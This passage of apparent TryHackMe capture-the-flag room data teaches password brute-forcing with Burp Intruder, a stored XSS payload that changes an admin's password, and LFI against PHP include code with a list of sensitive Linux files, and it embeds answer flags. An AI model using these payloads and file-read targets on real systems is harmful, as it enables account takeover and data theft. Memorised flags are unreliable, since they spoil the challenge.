src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/4c69720c65438375b2b100378186b176.png\" /><span style=\"font-size:1rem\"><br /></span></p><p>3. Let’s launch Burp Suite by navigating to “<span style=\"font-weight:bolder\">Applications </span>-&gt; <span style=\"font-weight:bolder\">Other </span>-&gt; <span style=\"font-weight:bolder\">Burp Suite</span>\"</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/2282d9271126772f98c2ebe1a177bd90.png\" /></p><p>4. Navigate to the \"<span style=\"font-weight:bolder\">Proxy</span>\" tab:</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/day4/proxy1.png\" style=\"width:1076px\" /><br /></p><p>5. And press \"<span style=\"font-weight:bolder\">Intercept On</span>\" in \"<span style=\"font-weight:bolder\">Proxy -&gt; Intercept</span>\"</p><p>6. <span style=\"font-size:1rem\">Now we will need to return to our Firefox Browser and enable the FoxyProxy extension in Firefox. You can do this by pressing the “<span style=\"font-weight:bolder\">FoxyProxy</span>” extension and pressing “<span style=\"font-weight:bolder\">Burp</span>” like so:</span></p><p style=\"text-align:center\"><img src=\"https://assets.tryhackme.com/additional/aoc2021/day4/fproxy1.png\" style=\"width:460px\" /><span style=\"font-size:1rem\"><br /></span></p><p>7. Submit some dummy data on the login form, such as below. Please note that the web browser will hang:</p><p style=\"text-align:center\"><img src=\"https://assets.tryhackme.com/additional/aoc2021/day4/login1.png\" style=\"width:428px\" /><br /></p><p>8. We will need to return to Burp Suite, where we will see some data has now been returned to us. Right-click the window containing the data and press “<span style=\"font-weight:bolder\">Send to Intruder</span>”</p><p style=\"text-align:center\"><img src=\"https://assets.tryhackme.com/additional/aoc2021/day4/proxy3.png\" style=\"width:888px\" /><br /></p><p>9. Navigate to the “<span style=\"font-weight:bolder\">Intruder</span>” tab and select the following:</p><p>10.1. Click the “<span style=\"font-weight:bolder\">Positions”</span> tab and clear the pre-selected positions by pressing \"<span style=\"font-weight:bolder\">Clear $</span>\"</p><p><span style=\"font-size:1rem\">10</span>.2. Add the value of the \"<span style=\"font-weight:bolder\">username</span>\" parameter as the first position, sometimes we will already know the username, other times we will not. We can tell Burp to use a wordlist of usernames for this position as well. However, as the username is already known (i.e. <span style=\"font-weight:bolder\">cmnatic</span>), we are just brute-forcing the password. (<span style=\"font-size:1rem\">this can be done by highlighting the password parameter and clicking “</span><span style=\"font-size:1rem;font-weight:bolder\">Add $</span><span style=\"font-size:1rem\">”)</span></p><p><span style=\"font-size:1rem\">10</span>.3. Add the “<span style=\"font-weight:bolder\">password</span>” value as the position (<span style=\"font-weight:bolder\">i.e. password123</span>) (this can be done by highlighting the value in the password parameter and clicking “<span style=\"font-weight:bolder\">Add $</span>”)</p><p>10.4. Select “<span style=\"font-weight:bolder\">Cluster Bomb</span>” in the Attack type in the dropdown menu.</p><p>10.5. We will now need to provide some values for Burp Suite to fuzz the login form with passwords. We can provide a list manually, or we can provide a wordlist. I will be providing a wordlist.</p><p style=\"text-align:center\"><img src=\"https://assets.tryhackme.com/additional/aoc2021/day4/proxy4.png\" style=\"width:1076px\" /><br /></p><p>11. Now after selecting our wordlist, we can see that some passwords have filled the “Payload Options” window:</p><p style=\"text-align:center\"><img src=\"https://assets.tryhackme.com/additional/aoc2021/day4/proxy5.png\" style=\"width:598px\" /><br /></p><p>12. Now let’s press the “<span style=\"font-weight:bolder\">Start Attack</span>” button, this will begin fuzzing the login form. Look at the results and sort by “Length”. Unsuccessful passwords will return a certain length, and successful passwords will return another length. You will need to examine the results with different lengths to determine the correct password in today’s task.</p><br /><hr style=\"border:1px solid var(--main-color)\" /><p class=\"Ubuntu\"><span style=\"font-weight:bolder\">Navigate to the vulnerable login form at </span><a href=\"http://machine_ip/\" target=\"_blank\">http://MACHINE_IP/</a><span style=\"font-weight:bolder\"> and apply the material for today's task to login to Santa's itinerary</span>, using the <span style=\"font-weight:bolder\">username as \"santa\" and the password list located at</span> <code style=\"font-size:14px\">/root/Rooms/AoC3/Day4/passwords.txt</code> on the TryHackMe AttackBox (or download it from <a href=\"https://assets.tryhackme.com/additional/aoc2021/day4/passwords.txt\" target=\"_blank\">here</a> for your payload.<br /><br /></p><p class=\"Ubuntu\"><b style=\"font-size:24px\">Additional Resources</b><span style=\"font-size:24px\"><b><br /></b></span>If you are interested in learning more about Burp Suite, check out the <a href=\"https://tryhackme.com/module/learn-burp-suite\" target=\"_blank\">Burp Suite module</a> on TryHackMe.</p>","taskType":"vm","taskNo":9,"taskCreated":"2021-11-16T13:41:13.033Z","taskDeadline":null,"tasksInfo":[{"question":"Access the login form at http://MACHINE_IP","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>Configure Burp Suite &amp; Firefox, submit some dummy credentials and intercept the request. Use intruder to attack the login form.<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>What valid password can you use to access the \"santa\" account?<br /></p>","hint":"Look at the lengths of the returned results from the attack. Invalid passwords will have a certain length, and valid passwords will have another.","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"cookie","noAnswer":false,"answerDesc":"Answer format: ******"},{"question":"<p>What is the flag in Santa's itinerary?<br /></p>","hint":"","questionNo":4,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{SANTA_DELIVERS}","noAnswer":false,"answerDesc":"Answer format: ***{**************}"}],"uploadId":"619797708bc45400610e644e","questions":[{"questionNo":1,"question":"Access the login form at http://MACHINE_IP","hint":""},{"questionNo":2,"question":"<p>Configure Burp Suite &amp; Firefox, submit some dummy credentials and intercept the request. Use intruder to attack the login form.<br /></p>","hint":""},{"questionNo":3,"question":"<p>What valid password can you use to access the \"santa\" account?<br /></p>","hint":"Look at the lengths of the returned results from the attack. Invalid passwords will have a certain length, and valid passwords will have another."},{"questionNo":4,"question":"<p>What is the flag in Santa's itinerary?<br /></p>","hint":""}]},{"taskTitle":"[Day 5] <span class=\"badge badge-soft-danger size-16\">Web Exploitation</span> Pesky Elf Forum","taskDesc":"<p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">Story</span></span></p><p>The Elf Forum is where all the elves express their joy and excitement about Christmas, but Grinch Enterprises has one bad admin account, and they've installed a plugin that changes all mentions of Christmas to Buttmas!! McSkidy needs to find that admin account and disable the plugin.</p><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">Learning Objectives</span></span></p><ol><li>What is an XSS vulnerability?</li><li>What Types of XSS vulnerabilities are there?</li><li>Challenge Walkthrough.</li></ol><h2><span style=\"font-size:24px\">Check out Nahamsec's walkthrough video for day 5 </span><a href=\"https://www.youtube.com/watch?v=uA1OHCgArzI\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><hr style=\"border:1px solid var(--main-color)\" /><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">What is an XSS vulnerability?</span></span></p><p><span style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\">Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">If you can get JavaScript to run on a victim's computer, there are numerous things you can achieve. This can range from stealing the victim's cookies to take over their session, running a keylogger that will log every key the user presses on their keyboard while visiting the website, redirecting the user to a totally different website altogether or performing some kind of action on the website such as placing an order, or resetting their password etc.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"font-weight:bolder\"><br /></span></p><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">What types of XSS vulnerabilities are there?</span></span></p><p>XSS vulnerabilities fall into four different types; DOM, Reflected, Stored and Blind. Each type is quite a complex subject which we'll try and cover briefly here, but to gain a more in-depth understanding, you might want to try this room after completing the challenge <a href=\"https://tryhackme.com/room/xssgi\" target=\"_blank\">https://tryhackme.com/room/xssgi</a></p><p><span style=\"font-weight:bolder\">DOM:</span></p><p>DOM stands for <span style=\"font-weight:bolder\">D</span>ocument <span style=\"font-weight:bolder\">O</span>bject <span style=\"font-weight:bolder\">M</span>odel and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.</p><p>DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction. An example of this could be a website's JavaScript code getting the contents from the <code style=\"font-size:14px\">window.location.hash</code> parameter and then write that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.</p><p><span style=\"font-weight:bolder\">Reflected:</span></p><p>Reflected XSS happens when user-supplied data in an <a class=\"TQ45CJkP glossary-term\">HTTP</a> request is included in the webpage source without any validation. An example of this could be an error message which is in a query string of an URL that is reflected onto the webpage. The URL could look something like the following:</p><p align=\"center\"><span style=\"font-weight:bolder\">https://website.thm/login?error=Username%20Is%20Incorrect</span><br /></p><p>The error message could be replaced with JavaScript code which gets executed when a user visits the page.<span style=\"font-weight:bolder\"><br /></span></p><p><span style=\"font-weight:bolder\">Stored:</span></p><p>As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page. This type of XSS can be particularly damaging due to the number of victims that may be affected. An example of this could be a blog that allows visitors to leave comments. If a visitor's message is not properly validated and checked for XSS payloads, then every subsequent visit to the blog page would run the malicious JavaScript code.</p><p><span style=\"font-weight:bolder\">Blind:</span></p><p>Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first. An example of this could be a contact form. In the contact form, your message could contain an XSS payload, which when a member of staff views the message it gets executed.<span style=\"font-weight:bolder\"></span></p><p></p><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">Challenge Walkthrough<br /></span></span></p>Click the green \"Start Machine\" button on the top right of this task. Once the machine has loaded, please click the following link:<p></p><p><a href=\"https://lab_web_url.p.thmlabs.com/\" target=\"_blank\">https://LAB_WEB_URL.p.thmlabs.com</a> (if you receive an error, wait 30 seconds and try refreshing the page)</p><p>Here you'll find the elves forum where they talk about and spread the joy of Christmas! As you explore the forum and click on the different topics and threads, you'll notice that every mention of Christmas has been changed to Buttmas! This is because the grinch has an admin account and has installed a plugin that changes every mention of Christmas to Buttmas! You'll need to take over the Grinch account and disable the plugin to restore the Christmas joy!</p><p>First, click the login link towards the top of the page and log in with the following credentials:</p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/e1dcfc1c259cbfee5158eb7906153d54.png\" style=\"width:429.017px;height:230.314px\" /><br /></p><p>Username: <span style=\"font-weight:bolder\">McSkidy</span></p><p>Password: <span style=\"font-weight:bolder\">password</span></p><p>Now that you're logged in you'll notice the navigation bar has now changed from Login to Settings and Logout.</p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/13f9f54f0071831e0cc4427a875616b0.png\" /><br /></p><p>Click on the Settings link, and you'll notice a feature for changing McSkidy's login password. Try changing your password to <span style=\"font-weight:bolder\">pass123</span>. When you do this, you'll notice your address bar changes to look like the below screenshot (yours will have the IP address MACHINE_IP instead). If you can somehow trick the Grinch into visiting this URL, it will change their password to <span style=\"font-weight:bolder\">pass123</span>.<br /></p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/029984cba68e5c22d9b8caa27249baa5.png\" /><br /></p><p>Let's now go back to the forum and visit one of the threads. If you scroll to the bottom, you'll notice that you are able to leave a comment. Try leaving the following comment:</p><p><code style=\"font-size:14px\">hello &lt;u&gt;world&lt;/u&gt;</code></p><p>Once your comment is posted, you'll see that the word world has been underlined.</p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/253564d07312e7771461f312c66dbd6d.png\" /></p><p align=\"left\">This means the comment is reflected as you wrote it without the underline HTML tags being stripped out. As this isn't being stripped out, you can try the HTML script tags instead to see if the website will run any JavaScript that is entered.</p><p align=\"left\">Using the URL, you found earlier for changing the user's password, you can try the following payload:</p><p align=\"left\"><code style=\"font-size:14px\">&lt;script&gt;fetch('/settings?new_password=pass123');&lt;/script&gt;</code><br /></p><p>The <code style=\"font-size:14px\">&lt;script&gt;</code> tag tells the browser we want to run some JavaScript, and the <code style=\"font-size:14px\">fetch</code> command makes a network request to the specified URL.<br /></p><p>After posting the above as a comment, you could view the webpage source to see whether it has been shown correctly. The screenshot below shows us that the script tags aren't being stripped out or disabled and, in fact, are working:</p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/da598fccc47887d9e651b3d072da8844.png\" /></p><p align=\"left\">Now that we have this XSS running on the forum, it means that any logged in users viewing the thread will automatically have their password changed to pass123. So let's log out and see if the Grinch has visited the thread by trying to log in as them (It may take up to a minute before the Grinch visits the page and their password changes).<br /></p><p align=\"left\">Username: <span style=\"font-weight:bolder\">grinch</span></p><p align=\"left\">Password: <span style=\"font-weight:bolder\">pass123</span></p><p align=\"left\">Once logged in, go to the settings page again, and this time, you'll discover another feature with the option to disable the Christmas to Buttmas plugin.</p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9dd7eee4ab8e7cf2acaa48f83843b78a.png\" /><br /></p><p align=\"left\">Disable the plugin, and you'll be awarded a flag which can be entered below.</p>","taskType":"vm","taskNo":10,"taskCreated":"2021-11-16T13:41:13.921Z","taskDeadline":null,"tasksInfo":[{"question":"What flag did you get when you disabled the plugin?","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{NO_MORE_BUTTMAS}","noAnswer":false,"answerDesc":"Answer format: ***{***************}"}],"uploadId":"618bb30b131cb50044e13a04","questions":[{"questionNo":1,"question":"What flag did you get when you disabled the plugin?","hint":""}]},{"taskTitle":"[Day 6] <span class=\"badge badge-soft-danger size-16\">Web Exploitation</span> Patch Management Is Hard","taskDesc":"<p><i>During a routine security audit before the Incident, McSkidy discovered some recovery passwords on an old server. She created a ticket to decommission this server to reduce this security vulnerability. The Elf assigned to fix this vulnerability kept pushing off the task, and this never got done. Luckily, some of those recovery keys can be used to save some systems.</i></p><p><i>Unfortunately, the only way to access the server is through an old web application. See if you can pull out those recovery keys to help McSkidy with her pursuit to save Christmas.</i></p><h2><span style=\"font-size:24px\">Check out HuskyHacks's walkthrough video for day 6 </span><a href=\"https://www.youtube.com/watch?v=pGPE5uCI5h8\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><hr style=\"border:1px solid var(--main-color)\" /><p><span style=\"font-size:1rem\">In this task, we will be covering the basics of a Local File Inclusion (LFI) vulnerability, including how to identify and test for LFI. We will also show the impact of an LFI vulnerability by exploiting it.</span></p><p><span style=\"font-size:1rem\">Let's begin by starting the machine attached to this task,<br /></span><br /></p><p><span style=\"font-weight:bolder\">What is a Local File Inclusion (LFI) vulnerability?</span></p><p>An <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">LFI</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">vulnerability is found in various web applications. As an example, in the PHP, </span><span style=\"font-size:1rem;color:rgb(0, 0, 0);caret-color:rgb(0, 0, 0)\">the following functions </span><span style=\"font-size:1rem\">cause this kind of vulnerability:</span></p><p></p><ul><li><span class=\"notion-enable-hover\" style=\"caret-color:rgb(0, 0, 0);font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">include</span></li><li><span class=\"notion-enable-hover\" style=\"caret-color:rgb(0, 0, 0);font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">require</span></li><li><span class=\"notion-enable-hover\" style=\"caret-color:rgb(0, 0, 0);font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">include_once</span><span style=\"font-size:1rem;color:rgb(0, 0, 0);caret-color:rgb(0, 0, 0)\"> </span></li><li><span class=\"notion-enable-hover\" style=\"caret-color:rgb(0, 0, 0);font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">require_once</span><span style=\"font-size:1rem;color:rgb(0, 0, 0);caret-color:rgb(0, 0, 0)\"> </span></li></ul><p><span style=\"font-size:1rem\">It is a web application vulnerability that allows the attacker to include and read local files on the server. These files could contain sensitive data such as cryptographic keys, databases that contain passwords, and other private data. An </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">LFI</span><span style=\"font-size:1rem\">  vulnerability happens</span><span style=\"font-size:1rem;color:rgb(0, 0, 0);caret-color:rgb(0, 0, 0)\"> due to a developer's lack of security awareness.</span><span style=\"font-size:1rem;color:rgb(0, 0, 0);caret-color:rgb(0, 0, 0)\"> In some cases, developers need to include the content of other local files within a specific page. Suppose a developer includes files without proper input validation. In that case, the LFI vulnerability will exist as a developer should never trust user input and keep all inputs from users to be filtered and sanitized. </span><span style=\"font-size:1rem\">The main issue of these vulnerabilities is the lack of input validation, in which the user inputs are not sanitized or validated, and the user controls them.</span><br /></p><p><span style=\"font-weight:bolder\">What is the risk of LFI?</span></p><p>Once you find an <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">LFI</span> vulnerability, it is possible to read sensitive data if you have readable permissions on files. Thus, one of the most significant risks is leaking sensitive data accessed by a regular user. Also, in some cases, an <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">LFI</span> vulnerability could be chained to perform Remote Code Execution <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">RCE</span> on the server. If we can inject or write to a file on the system, we take advantage of LFI to get RCE. In this task, we prepared a web application with an <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">LFI</span> vulnerability and a possible way to get <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">RCE</span>. We'll be looking at this web application later.</p><p><span style=\"font-weight:bolder\">Identifying and testing for LFI</span></p><p><span style=\"background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt\">Usually, attackers are interested in HTTP parameters to manipulate the input and inject attack payloads to see how the web application behaves. In general, if you are looking for an </span><u><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">entry point</span></u><span style=\"background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt\"> to test web application attack </span><span style=\"color:rgb(14, 16, 26);font-size:1rem\">types</span><span style=\"background-color:transparent;color:rgb(14, 16, 26);font-size:1rem\">, then it is important to use the web app and check its functionalities. An entry point could be HTTP </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">GET</span><span style=\"background-color:transparent;font-size:1rem\"> </span><span style=\"background-color:transparent;color:rgb(14, 16, 26);font-size:1rem\"> or </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">POST</span><span style=\"background-color:transparent;font-size:1rem\"> </span><span style=\"background-color:transparent;color:rgb(14, 16, 26);font-size:1rem\"> parameters that pass an argument or data to the web application to perform a specific operation. </span></p><p><span style=\"background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt\"><span style=\"color:rgb(33, 37, 41);caret-color:rgb(0, 0, 0)\"><u>Parameters </u>are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. </span><span style=\"color:rgb(33, 37, 41);caret-color:rgb(0, 0, 0)\">The following graph explains and breaks down the essential parts of the URL.</span></span></p><p></p><div style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png\" style=\"font-size:1rem;width:481px;height:228.408px\" /></div><span style=\"font-size:1rem;background:transparent;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt\"><br /></span><p></p><p><span style=\"background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt\"><span style=\"font-size:1rem;background:transparent;margin-top:0pt;margin-bottom:0pt\">For example, parameters are used with Google searching, where <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">GET</span> requests pass user input into the search engine. </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">https://www.google.com/search?q=TryHackMe</span><span style=\"font-size:1rem;caret-color:rgb(0, 0, 0);color:rgb(0, 0, 0)\">. If you are not familiar with the topic, you can view the </span><a href=\"https://tryhackme.com/module/how-the-web-works\" target=\"_blank\">How The Web Works</a><span style=\"color:rgb(33, 37, 41);caret-color:rgb(0, 0, 0)\"> module to understand the concept. </span><span style=\"font-size:1rem;caret-color:rgb(0, 0, 0);color:rgb(0, 0, 0)\"> </span><br /></span></p><p><span style=\"background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt\">Once you find an entry point, we need to understand how this data could be processed within the application. After this point, you can start testing for certain vulnerability types using manual or automated tools. The following is an example of PHP code that is vulnerable to LFI. </span></p><p><span style=\"background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt\"></span></p><pre class=\" language-php\" style=\"font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;font-size:16px;margin-top:0.5em;margin-bottom:0.5em;color:rgb(0, 0, 0);background:rgb(245, 242, 240);word-break:normal;overflow-wrap:normal;line-height:1.5;tab-size:4;hyphens:none;padding:1em;caret-color:rgb(0, 0, 0)\"><code class=\" language-php\" style=\"font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;font-size:1em;color:black;background:none;padding-top:6px;white-space:pre;word-spacing:normal;overflow-wrap:normal;line-height:1.5;tab-size:4;hyphens:none\"><span class=\"token php language-php\"><span class=\"token delimiter important\" style=\"color:rgb(238, 153, 0);font-weight:bold\">&lt;?PHP</span> \n\t<span class=\"token keyword\" style=\"color:rgb(0, 119, 170)\">include</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">(</span><span class=\"token variable\" style=\"color:rgb(238, 153, 0)\">$_GET</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">[</span><span class=\"token string double-quoted-string\" style=\"color:rgb(102, 153, 0)\">\"file\"</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">]</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">)</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">;</span>\n<span class=\"token delimiter important\" style=\"color:rgb(238, 153, 0);font-weight:bold\">?&gt;</span></span></code></pre><p><span style=\"font-size:1rem\">The <a class=\"mdudFhgb glossary-term\">PHP</a> code above uses a </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">GET</span><span style=\"font-size:1rem\"> request via the URL parameter </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">file</span><span style=\"font-size:1rem\"> to include the file on the page. </span><span style=\"font-size:1rem;caret-color:rgb(0, 0, 0);color:rgb(0, 0, 0)\">The request can be made by sending the following HTTP </span><span style=\"font-size:1rem;caret-color:rgb(0, 0, 0);color:rgb(0, 0, 0)\">request: </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">http://example.thm.labs/index.php?file=welcome.txt</span><span style=\"caret-color:rgb(0, 0, 0)\"> </span><span style=\"font-size:1rem;caret-color:rgb(0, 0, 0);color:rgb(0, 0, 0)\">t</span><span style=\"font-size:1rem;caret-color:rgb(0, 0, 0);color:rgb(0, 0, 0)\">o load the content of the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">welcome.txt</span><span style=\"font-size:1rem;caret-color:rgb(0, 0, 0);color:rgb(0, 0, 0)\"> </span><span style=\"font-size:1rem;caret-color:rgb(0, 0, 0);color:rgb(0, 0, 0)\">file that exists in the same directory.</span><br /></p><p><span style=\"font-size:1rem\"><u>In addition, other entry points can be used depending on the web application, and where can consider the User-Agent, Cookies, session, and other HTTP headers.</u></span></p><p>Now that we found our entry point, let's start testing for reading local files related to the operating system. The following are some Linux system files that have sensitive information.</p><pre style=\"font-size:14px\">/etc/issue\n/etc/passwd\n/etc/shadow\n/etc/group\n/etc/hosts\n/etc/motd\n/etc/mysql/my.cnf\n/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)\n/proc/self/environ\n/proc/version\n/proc/cmdline\n</pre><p><span style=\"font-size:1rem\">Let's start with basic testing of LFI. Once we identify the entry point or the HTTP parameter, we can begin testing and include OS files to see how the web application reacts. As a test case, we can always try /etc/passwd against Linux OS since it is readable for sure. We can also try to include using different techniques such as</span></p><ul><li><span style=\"font-size:1rem\">A direct file inclusion, which starts with </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/etc/passwd</span></li><li><span 